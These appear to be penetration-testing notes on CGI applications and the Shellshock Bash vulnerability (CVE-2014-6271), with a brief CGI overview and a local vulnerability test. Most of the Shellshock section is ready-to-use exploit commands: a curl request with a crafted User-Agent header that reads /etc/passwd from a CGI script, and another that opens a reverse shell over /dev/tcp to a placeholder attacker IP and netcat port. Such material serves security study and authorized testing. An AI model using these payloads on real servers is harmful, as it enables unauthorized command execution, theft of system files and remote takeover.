# CGI Applications

## **Introduction**

> * A Common Gateway Interface (CGI) is used to help a web server render dynamic pages and create a customized response for the user making a request via a web application.
> * CGI applications are primarily used to access other applications running on a web server.
> * CGI is essentially middleware between web servers, external databases, and information sources.
> * CGI scripts and programs are kept in the `/CGI-bin` directory on a web server
> * Typically written in C, C++, Java, PERL, etc
> * CGI scripts run in the security context of the web server

***

## **CGI Applications - Shellshock \[CVE-2014-6271]**

> * The most well-known CGI attack is exploiting the Shellshock (aka, "Bash bug") vulnerability via CGI.
> * **Resource:** https://nvd.nist.gov/vuln/detail/CVE-2014-6271
> * **Affected Versions:** `GNU Bash up until version 4.3`
> * **Description:** Shellshock is a security flaw in the Bash shell that allows an attacker to `execute operating system commands that are included after a function stored inside an environment variable.`
> * **PoC Example:** `env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"`
>   * Nothing will happen when the environment variable is assigned a value
>   * If the target is vulnerable, whenever the environment variable is imported, the command `echo vulnerable-shellshock` will be executed
>   * If the target is NOT vulnerable, then the command `echo not vulnerable` will be executed

**Shellshock PoC to read any file:**\
`curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://target.com/cgi-bin/access.cgi`

**Shellshock PoC to gain a Reverse Shell:**\
`curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/your-ip/your-nc-port 0>&1' http://target.com/cgi-bin/access.cgi`
